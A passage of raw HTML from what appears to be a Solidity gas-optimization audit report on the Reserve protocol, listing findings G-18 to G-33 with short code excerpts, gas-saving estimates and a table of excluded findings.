11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑18] Use a more recent version of solidity</h2>\n<ul>\n<li>Use a solidity version of at least 0.8.0 to get overflow protection without <code>SafeMath</code></li>\n<li>Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining</li>\n<li>Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads</li>\n<li>Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than <code>revert()/require()</code> strings</li>\n<li>Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value</li>\n</ul>\n<p><em>There are 7 instances of this issue.</em></p>\n<h2 id=\"g19-use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#g19-use-a-more-recent-version-of-solidity\" aria-label=\"g19 use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑19] Use a more recent version of solidity</h2>\n<ul>\n<li>Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining</li>\n<li>Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads</li>\n<li>Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than <code>revert()/require()</code> strings</li>\n<li>Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value</li>\n</ul>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">plugins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">aave</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReentrancyGuard</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.6</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &lt;</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/aave/ReentrancyGuard.sol#L3\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/aave/ReentrancyGuard.sol#L3</a></p>\n<h2 id=\"g20--costs-less-gas-than-\" style=\"position:relative;\"><a href=\"#g20--costs-less-gas-than-\" aria-label=\"g20  costs less gas than  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑20] <code>>=</code> costs less gas than <code>></code></h2>\n<p>The compiler uses opcodes <code>GT</code> and <code>ISZERO</code> for solidity code that uses <code>></code>, but only requires <code>LT</code> for <code>>=</code>, <a href=\"https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde\">which saves <strong>3 gas</strong></a>.</p>\n<p><em>There are 3 instances of this issue.</em></p>\n<h2 id=\"g21-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" style=\"position:relative;\"><a href=\"#g21-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" aria-label=\"g21 i costs less gas than i especially when its used in for loops   ii   too permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑21] <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</h2>\n<p>Saves <strong>5 gas per loop</strong>.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">tradesOpen</span><span class=\"mtk1\">--;</span></span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/Trading.sol#L72\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/Trading.sol#L72</a></p>\n<h2 id=\"g22-splitting-require-statements-that-use--saves-gas\" style=\"position:relative;\"><a href=\"#g22-splitting-require-statements-that-use--saves-gas\" aria-label=\"g22 splitting require statements that use  saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑22] Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</h2>\n<p>See <a href=\"https://github.com/code-423n4/2022-01-xdefi-findings/issues/128\">this issue</a> which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by <strong>3 gas</strong>.</p>\n<p><em>There are 15 instances of this issue.</em></p>\n<h2 id=\"g23-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" style=\"position:relative;\"><a href=\"#g23-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" aria-label=\"g23 usage of uintsints smaller than 32 bytes 256 bits incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑23] Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</h2>\n<blockquote>\n<p>When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.</p>\n</blockquote>\n<p><a href=\"https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\">https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html</a>\nEach operation involving a <code>uint8</code> costs an extra <a href=\"https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977\"><strong>22-28 gas</strong></a> (depending on whether the other operand is also a variable of type <code>uint8</code>) as compared to ones involving <code>uint256</code>, due to the compiler having to clear the higher bits of the memory word before operating on the <code>uint8</code>, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.</p>\n<p><em>There are 68 instances of this issue.</em></p>\n<h2 id=\"g24-using-private-rather-than-public-for-constants-saves-gas\" style=\"position:relative;\"><a href=\"#g24-using-private-rather-than-public-for-constants-saves-gas\" aria-label=\"g24 using private rather than public for constants saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑24] Using <code>private</code> rather than <code>public</code> for constants, saves gas</h2>\n<p>If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that <a href=\"https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178\">returns a tuple</a> of the values of all currently-public constants. Saves <strong>3406-3606 gas</strong> in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table.</p>\n<p><em>There are 11 instances of this issue.</em></p>\n<h2 id=\"g25-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" style=\"position:relative;\"><a href=\"#g25-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" aria-label=\"g25 require or revert statements that check input arguments should be at the top of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑25] <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</h2>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (<strong>2100 gas*</strong>) in a function that may ultimately revert in the unhappy case.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"g26-empty-blocks-should-be-removed-or-emit-something\" style=\"position:relative;\"><a href=\"#g26-empty-blocks-should-be-removed-or-emit-something\" aria-label=\"g26 empty blocks should be removed or emit something permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑26] Empty blocks should be removed or emit something</h2>\n<p>The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be <code>abstract</code> and the function signatures be added without any default implementation. If the block is an empty <code>if</code>-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (<code>if(x){}else if(y){...}else{...}</code> => <code>if(!x){if(y){...}else{...}}</code>). Empty <code>receive()</code>/<code>fallback() payable</code> functions that are not used, can be removed to save deployment gas.</p>\n<p><em>There are 3 instances of this issue.</em></p>\n<h2 id=\"g27-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g27-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g27 use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑27] Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas.</p>\n<p><em>There are 25 instances of this issue.</em></p>\n<h2 id=\"g28-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g28-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g28 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑28] Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n<code>CALLVALUE</code>(2),<code>DUP1</code>(3),<code>ISZERO</code>(3),<code>PUSH2</code>(3),<code>JUMPI</code>(10),<code>PUSH1</code>(3),<code>DUP1</code>(3),<code>REVERT</code>(0),<code>JUMPDEST</code>(1),<code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"g29-dont-use-_msgsender-if-not-supporting-eip-2771\" style=\"position:relative;\"><a href=\"#g29-dont-use-_msgsender-if-not-supporting-eip-2771\" aria-label=\"g29 dont use _msgsender if not supporting eip 2771 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑29] Don’t use <code>_msgSender()</code> if not supporting EIP-2771</h2>\n<p>Use <code>msg.sender</code> if the code does not implement <a href=\"https://eips.ethereum.org/EIPS/eip-2771\">EIP-2771 trusted forwarder</a> support.</p>\n<p><em>There are 35 instances of this issue.</em></p>\n<h2 id=\"g30-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" style=\"position:relative;\"><a href=\"#g30-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" aria-label=\"g30 public functions not called by the contract should be declared external instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑30] <code>public</code> functions not called by the contract should be declared <code>external</code> instead</h2>\n<p>Contracts <a href=\"https://docs.soliditylang.org/en/latest/contracts.html#function-overriding\">are allowed</a> to override their parents’ functions and change the visibility from <code>external</code> to <code>public</code> and <a href=\"https://ethereum.stackexchange.com/a/107939\">prior to solidity version 0.6.9</a> can save gas by doing so.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"excluded-findings\" style=\"position:relative;\"><a href=\"#excluded-findings\" aria-label=\"excluded findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excluded findings</h2>\n<p>These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness.</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑31]</td>\n<td align=\"left\"><code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</td>\n<td align=\"center\">12</td>\n<td align=\"center\">36</td>\n</tr>\n<tr>\n<td>[G‑32]</td>\n<td align=\"left\"><code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</td>\n<td align=\"center\">18</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑33]</td>\n<td align=\"left\">Using <code>bool</code>s for storage incurs overhead</td>\n<td align=\"center\">4</td>\n<td align=\"center\">68400</td>\n</tr>\n<tr>\n<td>[G‑34]</td>\n<td align=\"left\">Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</td>\n<td align=\"center\">11</td>\n<td align=\"center\">66</td>\n</tr>\n<tr>\n<td>[G‑35]</td>\n<td align=\"left\"><code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</td>\n<td align=\"center\">11</td>\n<td align=\"center\">55</td>\n</tr>\n<tr>\n<td>[G‑36]</td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">33</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑37]</td>\n<td align=\"left\">Division by two should use bit shifting</td>\n<td align=\"center\">8</td>\n<td align=\"center\">160</td>\n</tr>\n<tr>\n<td>[G‑38]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">151</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑39]</td>\n<td align=\"left\">Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td align=\"center\">12</td>\n<td align=\"center\">252</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 260 instances over 9 issues with <strong>68969 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.</p>\n<h2 id=\"g31-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" style=\"position:relative;\"><a href=\"#g31-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" aria-label=\"g31 arraylength should not be looked up in every loop of a for loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑31] <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</h2>\n<p>The overheads outlined below are <em>PER LOOP</em>, excluding the first loop</p>\n<ul>\n<li>storage arrays incur a Gwarmaccess (<strong>100 gas</strong>)</li>\n<li>memory arrays use <code>MLOAD</code> (<strong>3 gas</strong>)</li>\n<li>calldata arrays use <code>CALLDATALOAD</code> (<strong>3 gas</strong>)</li>\n</ul>\n<p>Caching the length changes each of these to a <code>DUP&#x3C;N></code> (<strong>3 gas</strong>), and gets rid of the extra <code>DUP&#x3C;N></code> needed to store the stack offset.</p>\n<p><em>There are 12 instances of this issue.</em></p>\n<h2 id=\"g32-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" style=\"position:relative;\"><a href=\"#g32-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" aria-label=\"g32 requirerevert strings longer than 32 bytes cost extra gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑32] <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</h2>\n<p>Each extra memory word of bytes past the original 32 <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings\">incurs an MSTORE</a> which costs <strong>3 gas</strong>.</p>\n<p><em>There are 18 instances of this issue.</em></p>\n<h2 id=\"g33-using-bools-for-storage-incurs-overhead\" style=\"position:relative;\"><a href=\"#g33-using-bools-for-storage-incurs-overhead\" aria-label=\"g33 using bools for storage incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑33] Using <code>bool</code>s for storage incurs overhead</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Booleans are more expensive than uint256 or any type that takes up a full</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// word because each write operation emits an extra SLOAD to first read the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// back. This is the compiler&#39;s defense against contract upgrades and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// pointer aliasing, and it cannot be disabled.</span></span></span></code></pre>\n<p><a 